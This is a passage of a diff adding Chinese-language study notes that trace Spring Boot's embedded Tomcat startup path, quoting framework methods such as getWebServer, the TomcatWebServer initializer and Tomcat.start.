+        			catch (ServletException ex) {
+        				throw new ApplicationContextException("Cannot initialize servlet context", ex);
+        			}
+        		}
+        		initPropertySources();
+        	}
+        
+        ```
+
+- getWebServer()进入到TomcatServletWebServerFactory类的`getWebServer()`
+
+    - ```java
+        	public WebServer getWebServer(ServletContextInitializer... initializers) {
+        		if (this.disableMBeanRegistry) {
+        			Registry.disableRegistry();
+        		}
+        		Tomcat tomcat = new Tomcat();
+        		File baseDir = (this.baseDirectory != null) ? this.baseDirectory : createTempDir("tomcat");
+        		tomcat.setBaseDir(baseDir.getAbsolutePath());
+        		for (LifecycleListener listener : this.serverLifecycleListeners) {
+        			tomcat.getServer().addLifecycleListener(listener);
+        		}
+        		Connector connector = new Connector(this.protocol);
+        		connector.setThrowOnFailure(true);
+        		tomcat.getService().addConnector(connector);
+        		customizeConnector(connector);
+        		tomcat.setConnector(connector);
+        		tomcat.getHost().setAutoDeploy(false);
+        		configureEngine(tomcat.getEngine());
+        		for (Connector additionalConnector : this.additionalTomcatConnectors) {
+        			tomcat.getService().addConnector(additionalConnector);
+        		}
+        		prepareContext(tomcat.getHost(), initializers);
+        		return getTomcatWebServer(tomcat);
+        	}
+        ```
+
+    - ```java
+        protected TomcatWebServer getTomcatWebServer(Tomcat tomcat) {
+        	return new TomcatWebServer(tomcat, getPort() >= 0);
+        }
+        ```
+
+- TomcatWebServer
+
+    - ```
+        	public TomcatWebServer(Tomcat tomcat, boolean autoStart, Shutdown shutdown) {
+        		Assert.notNull(tomcat, "Tomcat Server must not be null");
+        		this.tomcat = tomcat;
+        		this.autoStart = autoStart;
+        		this.gracefulShutdown = (shutdown == Shutdown.GRACEFUL) ? new GracefulShutdown(tomcat) : null;
+        		initialize();
+        	}
+        ```
+
+    - ```
+        private void initialize() throws WebServerException {
+        		logger.info("Tomcat initialized with port(s): " + getPortsDescription(false));
+        		synchronized (this.monitor) {
+        			try {
+        				addInstanceIdToEngineName();
+        
+        				Context context = findContext();
+        				context.addLifecycleListener((event) -> {
+        					if (context.equals(event.getSource()) && Lifecycle.START_EVENT.equals(event.getType())) {
+        						// Remove service connectors so that protocol binding doesn't
+        						// happen when the service is started.
+        						removeServiceConnectors();
+        					}
+        				});
+        
+        				// Start the server to trigger initialization listeners
+        				this.tomcat.start();
+        
+        				// We can re-throw failure exception directly in the main thread
+        				rethrowDeferredStartupExceptions();
+        
+        				try {
+        					ContextBindings.bindClassLoader(context, context.getNamingToken(), getClass().getClassLoader());
+        				}
+        				catch (NamingException ex) {
+        					// Naming is not enabled. Continue
+        				}
+        
+        				// Unlike Jetty, all Tomcat threads are daemon threads. We create a
+        				// blocking non-daemon to stop immediate shutdown
+        				startDaemonAwaitThread();
+        			}
+        			catch (Exception ex) {
+        				stopSilently();
+        				destroySilently();
+        				throw new WebServerException("Unable to start embedded Tomcat", ex);
+        			}
+        		}
+        	}
+        ```
+
+- 调用`this.tomcat.start()`正式进入内嵌的tomcat中
+
+    - ```java
+        public void start() throws LifecycleException {
+            getServer();
+            server.start();
+        }
+        ```
+
+- 调用`server.start();`进入启动tomcat入口类中
+
+    - tomcat启动的入口类方法，到此就已经可以跟踪tomcat启动的过程了。
